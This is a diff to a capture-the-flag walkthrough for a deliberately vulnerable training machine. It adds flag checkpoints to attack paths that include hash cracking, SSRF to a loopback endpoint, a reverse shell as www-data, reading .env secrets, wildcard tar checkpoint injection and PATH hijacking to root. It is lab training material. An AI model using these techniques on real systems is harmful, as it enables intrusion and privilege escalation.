@@ -47,10 +47,11 @@ There are three primary ways into the system.
 2. **Result**: You download a CSV containing a crackable password hash:
     - **Username**: `devops`
     - **MD5 hash**: `e10adc3949ba59abbe56e057f20f883e`
-3. **Exploit**: Crack the MD5 hash offline with `john` or `hashcat` using `rockyou.txt` to recover the SSH password `123456`.
-4. Use the recovered password to SSH into the box: `ssh devops@<vm_ip>`.
-5. **Important**: this opens the FansOnly restricted training shell, not a normal Linux shell.
-6. Useful starter commands inside the shell:
+3. **Flag check**: confirm the CSV `notes` field also contains `flag{initial-access-path-a-idor}` and the hint to crack the hash and SSH as `devops`.
+4. **Exploit**: Crack the MD5 hash offline with `john` or `hashcat` using `rockyou.txt` to recover the SSH password `123456`.
+5. Use the recovered password to SSH into the box: `ssh devops@<vm_ip>`.
+6. **Important**: this opens the FansOnly restricted training shell, not a normal Linux shell.
+7. Useful starter commands inside the shell:
    ```bash
    whoami
    pwd
@@ -65,11 +66,13 @@ There are three primary ways into the system.
 3. The tester input is blank by default. The docs page lists decoy event types, but the key hint is still that only loopback targets receive a live fetch.
 4. Enter the internal bootstrap URL: `http://127.0.0.1:9000/bootstrap`.
 5. **Result**: The response leaks an `adminToken`.
-6. **Exploit**: Use this token to sign up for an analyst account at `/account/analyst-signup`.
-7. Example analyst account:
+6. **Flag check**: confirm the response also includes `trainingFlag: flag{initial-access-path-b-ssrf}` plus the `nextHint` that points to analyst signup and the internal Admin API.
+7. **Exploit**: Use this token to sign up for an analyst account at `/account/analyst-signup`.
+8. Example analyst account:
    - **Email**: `analyst@fansonly.local`
    - **Password**: `123456`
-8. After signup, copy the session token shown on `/account`. You will need it for the admin-promotion step.
+9. After signup, copy the session token shown on `/account`. You will need it for the admin-promotion step.
+10. **Flag check**: confirm the analyst account page shows `flag{initial-access-path-b-analyst}` and a curl example for the analyst-to-admin promotion.
 
 ### Path C: Legacy Action Preview (RCE)
 1. The homepage banner identifies the tech stack: `react@19.1.0` and `next@15.1.0`.
@@ -84,6 +87,16 @@ There are three primary ways into the system.
    ```
    *Note:* the field currently executes the raw submitted command, so do not wrap the payload in JSON.
 5. **Result**: You should receive a connection back on your Kali listener, giving you a shell as `www-data`. Browser-interactive shell access at `/console` remains disabled, so the host-side execution must be observed through your listener.
+6. **Flag check**: from the `www-data` shell, inspect the breadcrumb file:
+   ```bash
+   cat /var/www/fan-store/legacy-preview-rce.txt
+   ```
+   Confirm it contains `flag{initial-access-path-c-rce}` and the hint to inspect `.env`.
+7. **Hint check**: inspect the deployed application environment file:
+   ```bash
+   cat /var/www/fan-store/.env
+   ```
+   Confirm the top comments repeat `flag{initial-access-path-c-rce}` and point you to `DEVOPS_SSH_PASSWORD`.
 
 ---
 
@@ -106,6 +119,17 @@ This path begins after Path C gives you a host-side shell as `www-data`.
    123456
    ```
 5. **Result**: You pivot from the compromised web user to the `devops` account and land in the FansOnly restricted training shell.
+6. **Flag check**: inspect the horizontal-escalation marker:
+   ```bash
+   cat /home/devops/flag-horizontal-1.txt
+   ```
+   Confirm it contains `flag{horizontal-escalation-1-devops}`.
+7. **Next-step hints**: inspect the breadcrumb notes now available in the `devops` home directory:
+   ```bash
+   cat /home/devops/note-1.txt
+   cat /home/devops/note-2.txt
+   ```
+   `note-1.txt` points to the analyst-to-admin path, and `note-2.txt` points to the wildcard `tar` root path.
 
 ### Horizontal Escalation 2: Analyst to Admin
 Once you have an analyst account and a session token (found on the `/account` page):
@@ -119,7 +143,10 @@ Once you have an analyst account and a session token (found on the `/account` pa
     ```
 4. **Result**: Your account is promoted to **Admin**.
 5. Refresh `/account` to verify that the role now reads `admin`.
-6. **Indicator**: the account view now exposes an admin-only **DB Credentials** tab with simulated internal secrets, confirming you completed the analyst-to-admin pivot.
+6. **Flag check**: confirm the account page banner shows `flag{horizontal-escalation-2-analyst-to-admin}`.
+7. Open the admin-only **DB Credentials** tab.
+8. **Flag check**: confirm the tab shows `flag{horizontal-escalation-2-admin-web}`.
+9. **Next-step hint**: confirm the tab also points you to `/usr/local/sbin/fansonly-maintenance.sh` and the `PATH`-hijack root path.
 
 ### Vertical: Escalating to Root
 From the `devops` SSH shell, there are two ways to get root. 
@@ -135,8 +162,10 @@ touch -- '--checkpoint=1'
 touch -- '--checkpoint-action=exec=sh shell.sh'
 whoami
 cat /root/root.txt
+cat /root/flag-vertical-1.txt
 ```
 When the cron job runs, it executes `shell.sh` as root.
+Check that the shell prints `flag{vertical-escalation-1-tar}` when the escalation completes. Then confirm `/root/root.txt` and `/root/flag-vertical-1.txt` both point you toward the remaining PATH-hijack route.
 
 #### 2. PATH Hijacking
 The file `/usr/local/sbin/fansonly-maintenance.sh` uses relative paths for binaries.
@@ -145,18 +174,27 @@ printf '#!/bin/sh\necho owned\n' > /home/devops/.local/bin/du
 chmod +x /home/devops/.local/bin/du
 id
 cat /root/root.txt
+cat /root/flag-vertical-2.txt
 ```
 Since `/home/devops/.local/bin` is first in the script's `PATH`, it executes your malicious `du` as root.
+Check that the shell prints `flag{vertical-escalation-2-path}` when the escalation completes. Then confirm `/root/root.txt` and `/root/flag-vertical-2.txt` both point you back toward the wildcard `tar` route.
 
 ---
 
 ## 🏆 Flag Summary
 
-| Challenge | Flag Location |
-| :--- | :--- |
-| **Initial Access** | `/internal/exports/users.csv` |
-| **App Security** | `adminToken` from SSRF |
-| **Privilege Escalation** | `/root/root.txt` |
+| Milestone | Flag | Where To Check |
+| :--- | :--- | :--- |
+| **Initial Access A** | `flag{initial-access-path-a-idor}` | `/internal/exports/users.csv` |
+| **Initial Access B** | `flag{initial-access-path-b-ssrf}` | webhook tester response for `http://127.0.0.1:9000/bootstrap` |
+| **Initial Access B Follow-up** | `flag{initial-access-path-b-analyst}` | analyst `/account` page |
+| **Initial Access C** | `flag{initial-access-path-c-rce}` | `/var/www/fan-store/legacy-preview-rce.txt` and comments at top of `/var/www/fan-store/.env` |
+| **Horizontal Escalation 1** | `flag{horizontal-escalation-1-devops}` | `/home/devops/flag-horizontal-1.txt` |
+| **Horizontal Escalation 2** | `flag{horizontal-escalation-2-analyst-to-admin}` | admin `/account` banner |
+| **Horizontal Escalation 2 Web Marker** | `flag{horizontal-escalation-2-admin-web}` | admin `/account` DB Credentials tab |
+| **Vertical Escalation 1** | `flag{vertical-escalation-1-tar}` | shell completion message and `/root/flag-vertical-1.txt` |
+| **Vertical Escalation 2** | `flag{vertical-escalation-2-path}` | shell completion message and `/root/flag-vertical-2.txt` |
+| **Root Marker** | `flag{fansonly-root-compromise-simulated}` | `/root/root.txt` |
 
 ---
 
